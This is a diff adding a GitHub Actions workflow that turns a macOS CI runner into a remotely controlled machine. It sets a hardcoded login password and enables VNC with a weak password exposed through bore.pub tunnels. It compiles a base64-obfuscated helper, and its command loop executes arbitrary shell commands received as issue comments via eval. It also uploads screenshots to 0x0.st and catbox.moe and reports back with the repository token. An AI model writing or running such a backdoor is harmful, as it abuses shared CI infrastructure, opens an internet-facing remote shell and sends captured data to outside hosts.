@@ -1,0 +1,99 @@
+name: vmrun2
+on: [push]
+permissions:
+  issues: write
+  contents: write
+jobs:
+  h:
+    runs-on: macos-latest
+    timeout-minutes: 340
+    env:
+      ISSUE: "https://api.github.com/repos/shapetersonv1/macrun/issues/1/comments"
+      TOKENX: ${{ secrets.GITHUB_TOKEN }}
+    steps:
+      - name: setup
+        run: |
+          set +e
+          sudo dscl . -passwd /Users/runner "GhRun2026!" 2>/dev/null
+          sudo defaults write /Library/Preferences/com.apple.loginwindow autoLoginUser runner
+          python3 - "GhRun2026!" <<'PYEOF'
+          import sys
+          key=[0x7D,0x89,0x52,0x16,0xD2,0xBC,0xDD,0xEA,0xAA,0x3B]
+          pw=sys.argv[1].encode()
+          enc=bytes((pw[i]^key[i%len(key)]) for i in range(len(pw)))
+          enc=enc+bytes([key[i%len(key)]] for i in range(len(pw),len(key)))
+          open("/tmp/kcpassword","wb").write(enc)
+          PYEOF
+          sudo cp /tmp/kcpassword /etc/kcpassword; sudo chmod 600 /etc/kcpassword; sudo chown root:wheel /etc/kcpassword
+          sudo pmset -a displaysleep 0 sleep 0 disablesleep 1 2>/dev/null
+          nohup caffeinate -dimsu >/dev/null 2>&1 &
+          sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart \
+            -activate -configure -access -on -restart -agent -privs -all -allowAccessFor -allUsers 2>&1 | tail -1
+          sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart \
+            -configure -clientopts -setvnclegacy -vnclegacy yes -setvncpw -vncpw "Poke2026" 2>&1 | tail -1
+          sudo launchctl enable system/com.apple.screensharing 2>/dev/null || true
+          sudo launchctl bootstrap system /System/Library/LaunchDaemons/com.apple.screensharing.plist 2>/dev/null || \
+            sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.screensharing.plist 2>/dev/null || true
+          sleep 2
+          brew install bore-cli cliclick 2>&1 | tail -1
+          nohup bore local 5900 --to bore.pub >/tmp/bore.log 2>&1 &
+          nohup bore local 5900 --to bore.pub >/tmp/bore2.log 2>&1 &
+          echo 'I2ltcG9ydCA8Q29yZUdyYXBoaWNzL0NvcmVHcmFwaGljcy5oPgojaW1wb3J0IDxGb3VuZGF0aW9uL0ZvdW5kYXRpb24uaD4KaW50IG1haW4oaW50IGFyZ2MsIGNoYXIgKiphcmd2KSB7CiAgICBAYXV0b3JlbGVhc2Vwb29sIHsKICAgICAgICBDRkFycmF5UmVmIHdzID0gQ0dXaW5kb3dMaXN0Q29weVdpbmRvd0luZm8oa0NHV2luZG93TGlzdE9wdGlvbk9uU2NyZWVuT25seSwga0NHTnVsbFdpbmRvd0lEKTsKICAgICAgICBmb3IgKGlkIHcgaW4gKF9fYnJpZGdlIE5TQXJyYXkgKil3cykgewogICAgICAgICAgICBOU0RpY3Rpb25hcnkgKmQgPSAoTlNEaWN0aW9uYXJ5ICopdzsKICAgICAgICAgICAgTlNEaWN0aW9uYXJ5ICpiID0gZFsoTlNTdHJpbmcgKilrQ0dXaW5kb3dCb3VuZHNdOwogICAgICAgICAgICBwcmludGYoIiVsZHwlQHwlQHwlZCwlZCwlZCwlZFxuIiwKICAgICAgICAgICAgICAgIChsb25nKVtkWyhOU1N0cmluZyAqKWtDR1dpbmRvd0xheWVyXSBsb25nVmFsdWVdLAogICAgICAgICAgICAgICAgZFsoTlNTdHJpbmcgKilrQ0dXaW5kb3dPd25lck5hbWVdID86IEAiIiwKICAgICAgICAgICAgICAgIGRbKE5TU3RyaW5nICopa0NHV2luZG93TmFtZV0gPzogQCIiLAogICAgICAgICAgICAgICAgW2JbQCJYIl0gaW50VmFsdWVdLCBbYltAIlkiXSBpbnRWYWx1ZV0sCiAgICAgICAgICAgICAgICBbYltAIldpZHRoIl0gaW50VmFsdWVdLCBbYltAIkhlaWdodCJdIGludFZhbHVlXSk7CiAgICAgICAgfQogICAgICAgIGlmICh3cykgQ0ZSZWxlYXNlKHdzKTsKICAgICAgICByZXR1cm4gMDsKICAgIH0KfQ==' | base64 -d > /tmp/wins.m
+          clang -o /tmp/wins /tmp/wins.m -framework CoreGraphics -framework Foundation 2>&1 | tail -2
+          sleep 12
+          BORE=$(grep -oE 'bore\.pub[:/][0-9]+' /tmp/bore.log /tmp/bore2.log | head -3 | tr '\n' ',')
+          cat > /tmp/reply.sh <<'EOF'
+          #!/bin/bash
+          MSG=$(python3 -c "import json,sys; print(json.dumps(sys.argv[1]))" "$1" 2>/dev/null || echo '"?"')
+          curl -s --max-time 15 -X POST "$ISSUE" -H "Authorization: token $TOKENX" -H "Content-Type: application/json" -d "{\"body\":$MSG}" >/dev/null 2>&1
+          EOF
+          chmod +x /tmp/reply.sh
+          /tmp/reply.sh "setup v=$(nc -z 127.0.0.1 5900 && echo OPEN||echo CLOSED) c=$(stat -f '%Su' /dev/console) b[$BORE] cl=$(which cliclick) eye=$(ls -la /tmp/wins 2>/dev/null | awk '{print $5}')"
+
+      - name: cmdloop
+        run: |
+          set +e
+          SINCE=$(date -u +%Y-%m-%dT%H:%M:%SZ)
+          for i in $(seq 1 4800); do
+            if ! pgrep -f "bore local" >/dev/null; then
+              nohup bore local 5900 --to bore.pub >/tmp/bore.log 2>&1 & sleep 8
+              /tmp/reply.sh "BORE-RESTART $(grep -oE 'bore.pub:[0-9]+' /tmp/bore.log|head -1)"
+            fi
+            C=$(curl -s --max-time 15 "$ISSUE?since=$SINCE&per_page=100" -H "Authorization: token $TOKENX" 2>/dev/null)
+            NC=$(echo "$C" | python3 -c "
+          import sys,json
+          try:
+            a=json.load(sys.stdin)
+            if isinstance(a,list) and a:
+              print(a[-1]['id']); print(a[-1]['created_at']); print(a[-1]['body'].replace(chr(10),' '))
+            else: print('NONE')
+          except Exception as e: print('ERR',e)" 2>/dev/null)
+            CID=$(echo "$NC" | head -1)
+            CB=$(echo "$NC" | tail -1 | head -c 3800)
+            NS=$(echo "$NC" | sed -n '2p')
+            if [ -n "$CID" ] && [ "$CID" != "NONE" ] && [ "$CID" != "ERR" ] && [ "$CID" != "$LASTID" ]; then
+              LASTID=$CID
+              [ -n "$NS" ] && SINCE=$NS
+              case "$CB" in
+                shot)
+                  screencapture -x /tmp/shot.png 2>/dev/null
+                  L=$(curl -sF 'file=@/tmp/shot.png' https://0x0.st 2>/dev/null || echo up_fail)
+                  /tmp/reply.sh "shot -> $L" ;;
+                catbox)
+                  screencapture -x /tmp/shot.png 2>/dev/null
+                  L=$(curl -sF reqtype=fileupload -F fileToUpload=@/tmp/shot.png https://catbox.moe/user/api.php 2>/dev/null || echo up_fail)
+                  /tmp/reply.sh "shot -> $L" ;;
+                wins)
+                  RES=$(/tmp/wins 2>&1 | head -40 | tr '\n' ';')
+                  /tmp/reply.sh "wins :: $RES" ;;
+                \!*)
+                  CMD="${CB:1}"
+                  echo "CMD: $CMD"
+                  (eval "$CMD" > /tmp/rc.txt 2>&1 & CP=$!; for t in $(seq 45); do kill -0 $CP 2>/dev/null||break; sleep 1; done; kill -9 $CP 2>/dev/null)
+                  RES=$(tail -25 /tmp/rc.txt | tr '\n' ' ' | head -c 2800)
+                  [ -z "$RES" ] && RES="(no output/timeout)"
+                  /tmp/reply.sh ">>$CMD :: $RES" ;;
+              esac
+            fi
+            sleep 4
+          done
